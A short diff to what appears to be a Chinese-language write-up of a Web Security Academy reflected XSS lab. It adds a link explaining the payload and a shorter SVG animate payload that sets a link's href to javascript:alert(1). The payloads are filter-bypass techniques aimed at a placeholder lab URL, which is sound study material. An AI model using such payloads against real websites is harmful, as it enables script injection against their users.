@@ -11,4 +11,8 @@ https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+
 ```
 https://YOUR-LAB-ID.web-security-academy.net/?search=<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me<text></a>
 ```
+[这段payload的原理](https://xz.aliyun.com/t/7612)
+```
+<svg><a><animate attributeName=href values=javascript:alert(1)/></a>
+```
 # 知识点
